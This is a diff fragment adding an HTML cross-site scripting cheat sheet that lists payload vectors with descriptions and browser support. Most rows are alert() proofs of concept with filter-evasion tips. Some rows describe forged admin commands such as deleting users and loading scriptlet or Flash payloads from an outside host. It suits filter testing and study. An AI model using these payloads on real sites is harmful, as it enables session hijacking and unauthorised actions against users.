+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">HTML Element Attacks</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">&lt;IMG LOWSRC="javascript:alert('XSS');"&gt;</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">IMG Lowsrc</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">Browser support: [&lt;span class="s"&gt;IE6.0&lt;/span&gt;|&lt;span class="s"&gt;NS8.1-IE&lt;/span&gt;] [&lt;span class="ns"&gt;NS8.1-G&lt;/span&gt;|&lt;span class="ns"&gt;FF1.5&lt;/span&gt;] [&lt;span class="ns"&gt;O8.54&lt;/span&gt;]</td>
+	</tr>
+	</table>
+	</td>
+</tr>
+</table>
+<table width="100%" border="0">
+<tr>
+	<td width="90%">Variant IMG Embedded commands 1</td>
+	<td width="10%"><div align="right"><input id="link20" type="button" value="[+] Expand" onClick="toggle_visibility('table20','link20');"></div></td>
+</tr>
+<tr>
+	<td colspan="2">
+	<table style="table-layout: fixed" width="100%" border="0" id="table20" name="table20">
+	<tr>
+		<td width="11%" bgcolor="#CCCCCC"><h3>Label</h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Code<h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Description</h3></td>
+		<td width="25%" bgcolor="#CCCCCC"><h3>Browser</h3></td>
+	</tr>
+	<tr>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">HTML Element Attacks</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">&lt;IMG SRC="http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode"&gt;</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">This works when the webpage where this is injected (like a web-board) is behind password protection and that password protection works with other commands on the same domain.  This can be used to delete users, add users (if the user who visits the page is an administrator), send credentials elsewhere, etc...  This is one of the lesser used but more useful XSS vectors.</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">Browser support: [&lt;span class="s"&gt;IE6.0&lt;/span&gt;|&lt;span class="s"&gt;NS8.1-IE&lt;/span&gt;] [&lt;span class="s"&gt;NS8.1-G&lt;/span&gt;|&lt;span class="s"&gt;FF1.5&lt;/span&gt;] [&lt;span class="s"&gt;O8.54&lt;/span&gt;]</td>
+	</tr>
+	</table>
+	</td>
+</tr>
+</table>
+<table width="100%" border="0">
+<tr>
+	<td width="90%" height="33" bgcolor="#E6E6E6">Variant IMG Embedded commands 2</td>
+	<td width="10%" height="33" bgcolor="#E6E6E6"><div align="right"><input id="link21" type="button" value="[+] Expand" onClick="toggle_visibility('table21','link21');"></div></td>
+</tr>
+<tr>
+	<td colspan="2">
+	<table style="table-layout: fixed" width="100%" border="0" id="table21" name="table21">
+	<tr>
+		<td width="11%" bgcolor="#CCCCCC"><h3>Label</h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Code<h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Description</h3></td>
+		<td width="25%" bgcolor="#CCCCCC"><h3>Browser</h3></td>
+	</tr>
+	<tr>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">HTML Element Attacks</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">Redirect 302 /a.jpg http://victimsite.com/admin.asp&deleteuser</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">IMG Embedded commands part II - this is more scary because there are absolutely no identifiers that make it look suspicious other than it is not hosted on your own domain. The vector uses a 302 or 304 (others work too) to redirect the image back to a command. So a normal &lt;IMG SRC="http://badguy.com/a.jpg"&gt; could actually be an attack vector to run commands as the user who views the image link. Here is the .htaccess (under Apache) line to accomplish the vector (thanks to Timo for part of this).</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">Browser support: [&lt;span class="s"&gt;IE6.0&lt;/span&gt;|&lt;span class="s"&gt;NS8.1-IE&lt;/span&gt;] [&lt;span class="s"&gt;NS8.1-G&lt;/span&gt;|&lt;span class="s"&gt;FF1.5&lt;/span&gt;] [&lt;span class="s"&gt;O8.54&lt;/span&gt;]</td>
+	</tr>
+	</table>
+	</td>
+</tr>
+</table>
+<table width="100%" border="0">
+<tr>
+	<td width="90%">Variant IMG STYLE w/expression</td>
+	<td width="10%"><div align="right"><input id="link22" type="button" value="[+] Expand" onClick="toggle_visibility('table22','link22');"></div></td>
+</tr>
+<tr>
+	<td colspan="2">
+	<table style="table-layout: fixed" width="100%" border="0" id="table22" name="table22">
+	<tr>
+		<td width="11%" bgcolor="#CCCCCC"><h3>Label</h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Code<h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Description</h3></td>
+		<td width="25%" bgcolor="#CCCCCC"><h3>Browser</h3></td>
+	</tr>
+	<tr>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">HTML Element Attacks</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">exp/*&lt;XSS STYLE='no\xss:noxss("*//*");
+xss:&amp;#101;x&amp;#x2F;*XSS*//*/*/pression(alert("XSS"))'&gt;</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">IMG STYLE with expression (this is really a hybrid of several CSS XSS vectors, but it really does show how hard STYLE tags can be to parse apart, like the other CSS examples this can send IE into a loop).</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">Browser support: [&lt;span class="s"&gt;IE6.0&lt;/span&gt;|&lt;span class="s"&gt;NS8.1-IE&lt;/span&gt;] [&lt;span class="ns"&gt;NS8.1-G&lt;/span&gt;|&lt;span class="ns"&gt;FF1.5&lt;/span&gt;] [&lt;span class="ns"&gt;O8.54&lt;/span&gt;]</td>
+	</tr>
+	</table>
+	</td>
+</tr>
+</table>
+<table width="100%" border="0">
+<tr>
+	<td width="90%" height="33" bgcolor="#E6E6E6">Variant List-style-image</td>
+	<td width="10%" height="33" bgcolor="#E6E6E6"><div align="right"><input id="link23" type="button" value="[+] Expand" onClick="toggle_visibility('table23','link23');"></div></td>
+</tr>
+<tr>
+	<td colspan="2">
+	<table style="table-layout: fixed" width="100%" border="0" id="table23" name="table23">
+	<tr>
+		<td width="11%" bgcolor="#CCCCCC"><h3>Label</h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Code<h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Description</h3></td>
+		<td width="25%" bgcolor="#CCCCCC"><h3>Browser</h3></td>
+	</tr>
+	<tr>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">HTML Element Attacks</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">&lt;STYLE&gt;li {list-style-image: url("javascript:alert('XSS')");}&lt;/STYLE&gt;&lt;UL&gt;&lt;LI&gt;XSS</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">Fairly esoteric issue dealing with embedding images for bulleted lists. This will only work in the IE rendering engine because of the JavaScript directive. Not a particularly useful cross site scripting vector.</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">Browser support: [&lt;span class="s"&gt;IE6.0&lt;/span&gt;|&lt;span class="s"&gt;NS8.1-IE&lt;/span&gt;] [&lt;span class="ns"&gt;NS8.1-G&lt;/span&gt;|&lt;span class="ns"&gt;FF1.5&lt;/span&gt;] [&lt;span class="ns"&gt;O8.54&lt;/span&gt;]</td>
+	</tr>
+	</table>
+	</td>
+</tr>
+</table>
+<table width="100%" border="0">
+<tr>
+	<td width="90%">Variant IMG w/VBscript</td>
+	<td width="10%"><div align="right"><input id="link24" type="button" value="[+] Expand" onClick="toggle_visibility('table24','link24');"></div></td>
+</tr>
+<tr>
+	<td colspan="2">
+	<table style="table-layout: fixed" width="100%" border="0" id="table24" name="table24">
+	<tr>
+		<td width="11%" bgcolor="#CCCCCC"><h3>Label</h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Code<h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Description</h3></td>
+		<td width="25%" bgcolor="#CCCCCC"><h3>Browser</h3></td>
+	</tr>
+	<tr>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">HTML Element Attacks</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">&lt;IMG SRC='vbscript:msgbox("XSS")'&gt;</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">VBscript in an image</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">Browser support: [&lt;span class="s"&gt;IE6.0&lt;/span&gt;|&lt;span class="s"&gt;NS8.1-IE&lt;/span&gt;] [&lt;span class="ns"&gt;NS8.1-G&lt;/span&gt;|&lt;span class="ns"&gt;FF1.5&lt;/span&gt;] [&lt;span class="ns"&gt;O8.54&lt;/span&gt;]</td>
+	</tr>
+	</table>
+	</td>
+</tr>
+</table>
+<table width="100%" border="0">
+<tr>
+	<td width="90%" height="33" bgcolor="#E6E6E6">Variant US-ASCII encoding</td>
+	<td width="10%" height="33" bgcolor="#E6E6E6"><div align="right"><input id="link25" type="button" value="[+] Expand" onClick="toggle_visibility('table25','link25');"></div></td>
+</tr>
+<tr>
+	<td colspan="2">
+	<table style="table-layout: fixed" width="100%" border="0" id="table25" name="table25">
+	<tr>
+		<td width="11%" bgcolor="#CCCCCC"><h3>Label</h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Code<h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Description</h3></td>
+		<td width="25%" bgcolor="#CCCCCC"><h3>Browser</h3></td>
+	</tr>
+	<tr>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">HTML Element Attacks</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">%BCscript%BEalert(%A2XSS%A2)%BC/script%BE</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">Found by Kurt Huwig http://www.iku-ag.de/ This uses malformed ASCII encoding with 7 bits instead of 8.  This XSS may bypass many content filters but only works if the hosts transmits in US-ASCII encoding, or if you set the encoding yourself.  This is more useful against web application firewall cross site scripting evasion than it is server side filter evasion.  Apache Tomcat is the only known server that transmits in US-ASCII encoding.</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">Browser support: [&lt;span class="s"&gt;IE6.0&lt;/span&gt;|&lt;span class="s"&gt;NS8.1-IE&lt;/span&gt;] [&lt;span class="ns"&gt;NS8.1-G&lt;/span&gt;|&lt;span class="ns"&gt;FF1.5&lt;/span&gt;] [&lt;span class="ns"&gt;O8.54&lt;/span&gt;] [&lt;span class="ns"&gt;NS4&lt;/span&gt;]</td>
+	</tr>
+	</table>
+	</td>
+</tr>
+</table>
+<table width="100%" border="0">
+<tr>
+	<td width="90%">Variant META</td>
+	<td width="10%"><div align="right"><input id="link26" type="button" value="[+] Expand" onClick="toggle_visibility('table26','link26');"></div></td>
+</tr>
+<tr>
+	<td colspan="2">
+	<table style="table-layout: fixed" width="100%" border="0" id="table26" name="table26">
+	<tr>
+		<td width="11%" bgcolor="#CCCCCC"><h3>Label</h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Code<h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Description</h3></td>
+		<td width="25%" bgcolor="#CCCCCC"><h3>Browser</h3></td>
+	</tr>
+	<tr>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">HTML Element Attacks</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">&lt;META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');"&gt;</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">The odd thing about meta refresh is that it doesn't send a referrer in the header - so it can be used for certain types of attacks where you need to get rid of referring URLs.</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">Browser support: [&lt;span class="s"&gt;IE6.0&lt;/span&gt;|&lt;span class="s"&gt;NS8.1-IE&lt;/span&gt;] [&lt;span class="s"&gt;NS8.1-G&lt;/span&gt;|&lt;span class="s"&gt;FF1.5&lt;/span&gt;] [&lt;span class="ns"&gt;O8.54&lt;/span&gt;]</td>
+	</tr>
+	</table>
+	</td>
+</tr>
+</table>
+<table width="100%" border="0">
+<tr>
+	<td width="90%" height="33" bgcolor="#E6E6E6">Variant META w/data:URL</td>
+	<td width="10%" height="33" bgcolor="#E6E6E6"><div align="right"><input id="link27" type="button" value="[+] Expand" onClick="toggle_visibility('table27','link27');"></div></td>
+</tr>
+<tr>
+	<td colspan="2">
+	<table style="table-layout: fixed" width="100%" border="0" id="table27" name="table27">
+	<tr>
+		<td width="11%" bgcolor="#CCCCCC"><h3>Label</h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Code<h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Description</h3></td>
+		<td width="25%" bgcolor="#CCCCCC"><h3>Browser</h3></td>
+	</tr>
+	<tr>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">HTML Element Attacks</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">&lt;META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K"&gt;</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">This is nice because it also doesn't have anything visibly that has the word SCRIPT or the JavaScript directive in it, since it utilizes base64 encoding. Please see http://www.ietf.org/rfc/rfc2397.txt for more details</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">Browser support: [&lt;span class="ns"&gt;IE6.0&lt;/span&gt;|&lt;span class="ns"&gt;NS8.1-IE&lt;/span&gt;] [&lt;span class="s"&gt;NS8.1-G&lt;/span&gt;|&lt;span class="s"&gt;FF1.5&lt;/span&gt;] [&lt;span class="s"&gt;O8.54&lt;/span&gt;]</td>
+	</tr>
+	</table>
+	</td>
+</tr>
+</table>
+<table width="100%" border="0">
+<tr>
+	<td width="90%">Variant META w/additional URL parameter</td>
+	<td width="10%"><div align="right"><input id="link28" type="button" value="[+] Expand" onClick="toggle_visibility('table28','link28');"></div></td>
+</tr>
+<tr>
+	<td colspan="2">
+	<table style="table-layout: fixed" width="100%" border="0" id="table28" name="table28">
+	<tr>
+		<td width="11%" bgcolor="#CCCCCC"><h3>Label</h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Code<h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Description</h3></td>
+		<td width="25%" bgcolor="#CCCCCC"><h3>Browser</h3></td>
+	</tr>
+	<tr>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">HTML Element Attacks</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">&lt;META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert('XSS');"&gt;</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">Meta with additional URL parameter. If the target website attempts to see if the URL contains an "http://" you can evade it with the following technique (Submitted by Moritz Naumann http://www.moritz-naumann.com)</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">Browser support: [&lt;span class="s"&gt;IE6.0&lt;/span&gt;|&lt;span class="s"&gt;NS8.1-IE&lt;/span&gt;] [&lt;span class="ns"&gt;NS8.1-G&lt;/span&gt;|&lt;span class="ns"&gt;FF1.5&lt;/span&gt;] [&lt;span class="ns"&gt;O8.54&lt;/span&gt;]</td>
+	</tr>
+	</table>
+	</td>
+</tr>
+</table>
+<table width="100%" border="0">
+<tr>
+	<td width="90%" height="33" bgcolor="#E6E6E6">Variant OBJECT</td>
+	<td width="10%" height="33" bgcolor="#E6E6E6"><div align="right"><input id="link29" type="button" value="[+] Expand" onClick="toggle_visibility('table29','link29');"></div></td>
+</tr>
+<tr>
+	<td colspan="2">
+	<table style="table-layout: fixed" width="100%" border="0" id="table29" name="table29">
+	<tr>
+		<td width="11%" bgcolor="#CCCCCC"><h3>Label</h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Code<h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Description</h3></td>
+		<td width="25%" bgcolor="#CCCCCC"><h3>Browser</h3></td>
+	</tr>
+	<tr>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">HTML Element Attacks</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">&lt;OBJECT TYPE="text/x-scriptlet" DATA="http://ha.ckers.org/scriptlet.html"&gt;&lt;/OBJECT&gt;</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">If they allow objects, you can also inject virus payloads to infect the users, etc. and same with the APPLET tag. The linked file is actually an HTML file that can contain your XSS</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">Browser support: [&lt;span class="ns"&gt;IE6.0&lt;/span&gt;|&lt;span class="ns"&gt;NS8.1-IE&lt;/span&gt;] [&lt;span class="ns"&gt;NS8.1-G&lt;/span&gt;|&lt;span class="ns"&gt;FF1.5&lt;/span&gt;] [&lt;span class="s"&gt;O8.54&lt;/span&gt;]</td>
+	</tr>
+	</table>
+	</td>
+</tr>
+</table>
+<table width="100%" border="0">
+<tr>
+	<td width="90%">Variant OBJECT w/Embedded XSS</td>
+	<td width="10%"><div align="right"><input id="link30" type="button" value="[+] Expand" onClick="toggle_visibility('table30','link30');"></div></td>
+</tr>
+<tr>
+	<td colspan="2">
+	<table style="table-layout: fixed" width="100%" border="0" id="table30" name="table30">
+	<tr>
+		<td width="11%" bgcolor="#CCCCCC"><h3>Label</h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Code<h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Description</h3></td>
+		<td width="25%" bgcolor="#CCCCCC"><h3>Browser</h3></td>
+	</tr>
+	<tr>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">HTML Element Attacks</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">&lt;OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389&gt;&lt;param name=url value=javascript:alert('XSS')&gt;&lt;/OBJECT&gt;</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">Using an OBJECT tag you can embed XSS directly (this is unverified).</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">Browser support:</td>
+	</tr>
+	</table>
+	</td>
+</tr>
+</table>
+<table width="100%" border="0">
+<tr>
+	<td width="90%" height="33" bgcolor="#E6E6E6">Variant Embed Flash</td>
+	<td width="10%" height="33" bgcolor="#E6E6E6"><div align="right"><input id="link31" type="button" value="[+] Expand" onClick="toggle_visibility('table31','link31');"></div></td>
+</tr>
+<tr>
+	<td colspan="2">
+	<table style="table-layout: fixed" width="100%" border="0" id="table31" name="table31">
+	<tr>
+		<td width="11%" bgcolor="#CCCCCC"><h3>Label</h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Code<h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Description</h3></td>
+		<td width="25%" bgcolor="#CCCCCC"><h3>Browser</h3></td>
+	</tr>
+	<tr>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">HTML Element Attacks</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">&lt;EMBED SRC="http://ha.ckers.org/xss.swf" AllowScriptAccess="always"&gt;&lt;/EMBED&gt;</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">Using an EMBED tag you can embed a Flash movie that contains XSS. If you add the attributes allowScriptAccess="never" and allownetworking="internal" it can mitigate this risk (thank you to Jonathan Vanasco for the info). Demo: http://ha.ckers.org/weird/xssflash.html :</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">Browser support: [&lt;span class="s"&gt;IE6.0&lt;/span&gt;|&lt;span class="s"&gt;NS8.1-IE&lt;/span&gt;] [&lt;span class="s"&gt;NS8.1-G&lt;/span&gt;|&lt;span class="s"&gt;FF1.5&lt;/span&gt;] [&lt;span class="s"&gt;O8.54&lt;/span&gt;]</td>
+	</tr>
+	</table>
+	</td>
+</tr>
+</table>
+<table width="100%" border="0">
+<tr>
+	<td width="90%">Variant OBJECT w/Flash 2</td>
+	<td width="10%"><div align="right"><input id="link32" type="button" value="[+] Expand" onClick="toggle_visibility('table32','link32');"></div></td>
+</tr>
+<tr>
+	<td colspan="2">
+	<table style="table-layout: fixed" width="100%" border="0" id="table32" name="table32">
+	<tr>
+		<td width="11%" bgcolor="#CCCCCC"><h3>Label</h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Code<h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Description</h3></td>
+		<td width="25%" bgcolor="#CCCCCC"><h3>Browser</h3></td>
+	</tr>
+	<tr>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">HTML Element Attacks</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">a="get";&amp;#10;b="URL("";&amp;#10;c="javascript:";&amp;#10;d="alert('XSS');")";
+eval(a+b+c+d);</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">Using this action script inside flash can obfuscate your XSS vector.</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">Browser support: [&lt;span class="s"&gt;IE6.0&lt;/span&gt;|&lt;span class="s"&gt;NS8.1-IE&lt;/span&gt;] [&lt;span class="s"&gt;NS8.1-G&lt;/span&gt;|&lt;span class="s"&gt;FF1.5&lt;/span&gt;] [&lt;span class="s"&gt;O8.54&lt;/span&gt;]</td>
+	</tr>
+	</table>
+	</td>
+</tr>
+</table>
+<table width="100%" border="0">
+<tr>
+	<td width="90%" height="33" bgcolor="#E6E6E6">Variant STYLE w/Comment</td>
+	<td width="10%" height="33" bgcolor="#E6E6E6"><div align="right"><input id="link33" type="button" value="[+] Expand" onClick="toggle_visibility('table33','link33');"></div></td>
+</tr>
+<tr>
+	<td colspan="2">
+	<table style="table-layout: fixed" width="100%" border="0" id="table33" name="table33">
+	<tr>
+		<td width="11%" bgcolor="#CCCCCC"><h3>Label</h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Code<h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Description</h3></td>
+		<td width="25%" bgcolor="#CCCCCC"><h3>Browser</h3></td>
+	</tr>
+	<tr>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">HTML Element Attacks</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">&lt;IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))"&gt;</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">STYLE attribute using a comment to break up expression (Thanks to Roman Ivanov http://www.pixel-apes.com/ for this one)</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">Browser support: [&lt;span class="s"&gt;IE6.0&lt;/span&gt;|&lt;span class="s"&gt;NS8.1-IE&lt;/span&gt;] [&lt;span class="ns"&gt;NS8.1-G&lt;/span&gt;|&lt;span class="ns"&gt;FF1.5&lt;/span&gt;] [&lt;span class="ns"&gt;O8.54&lt;/span&gt;]</td>
+	</tr>
+	</table>
+	</td>
+</tr>
+</table>
+<table width="100%" border="0">
+<tr>
+	<td width="90%">Variant STYLE w/Anonymous HTML</td>
+	<td width="10%"><div align="right"><input id="link34" type="button" value="[+] Expand" onClick="toggle_visibility('table34','link34');"></div></td>
+</tr>
+<tr>
+	<td colspan="2">
+	<table style="table-layout: fixed" width="100%" border="0" id="table34" name="table34">
+	<tr>
+		<td width="11%" bgcolor="#CCCCCC"><h3>Label</h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Code<h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Description</h3></td>
+		<td width="25%" bgcolor="#CCCCCC"><h3>Browser</h3></td>
+	</tr>
+	<tr>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">HTML Element Attacks</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">&lt;XSS STYLE="xss:expression(alert('XSS'))"&gt;</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">Anonymous HTML with STYLE attribute (IE and Netscape 8.1+ in IE rendering engine mode don't really care if the HTML tag you build exists or not, as long as it starts with an open angle bracket and a letter)</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">Browser support: [&lt;span class="s"&gt;IE6.0&lt;/span&gt;|&lt;span class="s"&gt;NS8.1-IE&lt;/span&gt;] [&lt;span class="ns"&gt;NS8.1-G&lt;/span&gt;|&lt;span class="ns"&gt;FF1.5&lt;/span&gt;] [&lt;span class="ns"&gt;O8.54&lt;/span&gt;]</td>
+	</tr>
+	</table>
+	</td>
+</tr>
+</table>
+<table width="100%" border="0">
+<tr>
+	<td width="90%" height="33" bgcolor="#E6E6E6">Variant STYLE w/background-image</td>
+	<td width="10%" height="33" bgcolor="#E6E6E6"><div align="right"><input id="link35" type="button" value="[+] Expand" onClick="toggle_visibility('table35','link35');"></div></td>
+</tr>
+<tr>
+	<td colspan="2">
+	<table style="table-layout: fixed" width="100%" border="0" id="table35" name="table35">
+	<tr>
+		<td width="11%" bgcolor="#CCCCCC"><h3>Label</h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Code<h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Description</h3></td>
+		<td width="25%" bgcolor="#CCCCCC"><h3>Browser</h3></td>
+	</tr>
+	<tr>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">HTML Element Attacks</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">&lt;STYLE&gt;.XSS{background-image:url("javascript:alert('XSS')");}&lt;/STYLE&gt;&lt;A CLASS=XSS&gt;&lt;/A&gt;</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">STYLE tag using background-image.</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">Browser support: [&lt;span class="s"&gt;IE6.0&lt;/span&gt;|&lt;span class="s"&gt;NS8.1-IE&lt;/span&gt;] [&lt;span class="ns"&gt;NS8.1-G&lt;/span&gt;|&lt;span class="ns"&gt;FF1.5&lt;/span&gt;] [&lt;span class="ns"&gt;O8.54&lt;/span&gt;]</td>
+	</tr>
+	</table>
+	</td>
+</tr>
+</table>
+<table width="100%" border="0">
+<tr>
+	<td width="90%">Variant STYLE w/background</td>
+	<td width="10%"><div align="right"><input id="link36" type="button" value="[+] Expand" onClick="toggle_visibility('table36','link36');"></div></td>
+</tr>
+<tr>
+	<td colspan="2">
+	<table style="table-layout: fixed" width="100%" border="0" id="table36" name="table36">
+	<tr>
+		<td width="11%" bgcolor="#CCCCCC"><h3>Label</h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Code<h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Description</h3></td>
+		<td width="25%" bgcolor="#CCCCCC"><h3>Browser</h3></td>
+	</tr>
+	<tr>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">HTML Element Attacks</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">&lt;STYLE type="text/css"&gt;BODY{background:url("javascript:alert('XSS')")}&lt;/STYLE&gt;</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">STYLE tag using background.</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">Browser support: [&lt;span class="s"&gt;IE6.0&lt;/span&gt;|&lt;span class="s"&gt;NS8.1-IE&lt;/span&gt;] [&lt;span class="ns"&gt;NS8.1-G&lt;/span&gt;|&lt;span class="ns"&gt;FF1.5&lt;/span&gt;] [&lt;span class="ns"&gt;O8.54&lt;/span&gt;]</td>
+	</tr>
+	</table>
+	</td>
+</tr>
+</table>
+<table width="100%" border="0">
+<tr>
+	<td width="90%" height="33" bgcolor="#E6E6E6">Variant Stylesheet</td>
+	<td width="10%" height="33" bgcolor="#E6E6E6"><div align="right"><input id="link37" type="button" value="[+] Expand" onClick="toggle_visibility('table37','link37');"></div></td>
+</tr>
+<tr>
+	<td colspan="2">
+	<table style="table-layout: fixed" width="100%" border="0" id="table37" name="table37">
+	<tr>
+		<td width="11%" bgcolor="#CCCCCC"><h3>Label</h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Code<h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Description</h3></td>
+		<td width="25%" bgcolor="#CCCCCC"><h3>Browser</h3></td>
+	</tr>
+	<tr>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">HTML Element Attacks</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">&lt;LINK REL="stylesheet" HREF="javascript:alert('XSS');"&gt;</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">Stylesheet</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">Browser support: [&lt;span class="s"&gt;IE6.0&lt;/span&gt;|&lt;span class="s"&gt;NS8.1-IE&lt;/span&gt;] [&lt;span class="ns"&gt;NS8.1-G&lt;/span&gt;|&lt;span class="ns"&gt;FF1.5&lt;/span&gt;] [&lt;span class="s"&gt;O8.54&lt;/span&gt;]</td>
+	</tr>
+	</table>
+	</td>
+</tr>
+</table>
+<table width="100%" border="0">
